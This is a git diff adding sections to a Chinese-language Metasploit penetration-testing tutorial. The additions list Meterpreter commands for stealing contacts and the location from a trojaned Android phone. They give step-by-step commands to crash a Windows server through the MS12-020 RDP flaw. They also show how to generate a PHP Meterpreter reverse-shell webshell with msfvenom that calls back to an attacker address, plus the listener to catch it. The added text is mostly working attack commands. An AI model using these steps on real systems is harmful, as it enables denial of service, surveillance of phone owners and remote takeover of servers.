@@ -16,6 +16,7 @@
 [十四、Metasploit之木马的用户操作及摄像头操作](#十四)  
 [十五、Metasploit之渗透安卓实战](#十五)  
 [十六、Metasploit之服务器蓝屏攻击](#十六)  
+[十七、Metasploit之生成webshell及应用](#十七)
 
 ==============================
 
@@ -254,9 +255,46 @@ payloads：shellcode，漏洞利用后执行的代码
 -->webcam_stream    //摄像头监控</br>
 -->check_root   //检测root</br>
 -->dump_calllog     //下载电话
+-->dump_contacts</br>
+-->geolocate    //定位</br>
+-->execute
 
 
 <h5 id="十六">十六、Metasploit之服务器蓝屏攻击</h5>
 
+DDOS</br>
+服务器开启3389
 
+漏洞：MS12 020</br>
+#msfconsole</br>
+->search ms12-020</br>
+得到下面结果：</br>
+1）auxiliary/dos/windows/rdp/ms12_020_maxchannelids</br>
+服务器远程桌面的一个利用模块
+2）auxiliary/scanner/rdp/ms12_020_check</br>
+扫描主机是否存在漏洞</br>
+
+->use auxiliary/scanner/rdp/ms12_020_check</br>
+->set RHOST 192.168.0.104</br>
+->exploit</br>
+确定是否存在漏洞
+
+->use auxiliary/dox/windows/rdp/ms12_020_maxchannelids</br>
+->set RHOST 192.168.0.104</br>
+->exploit</br>
+服务器蓝屏
+
+
+<h5 id="十七">十七、Metasploit之生成webshell及应用</h5>
+
+#msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.100 R >web.php</br>
+kali2.0使用msfvenom</br>
+#msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f raw >web.php
+
+#msfconsole</br>
+->use exploit/multi/handler</br>
+->exploit(等待目标主机触发php)
+
+注：msfvenom生成各类payload命令</br>
+https://blog.csdn.net/qq_34457594/article/details/52756458
 
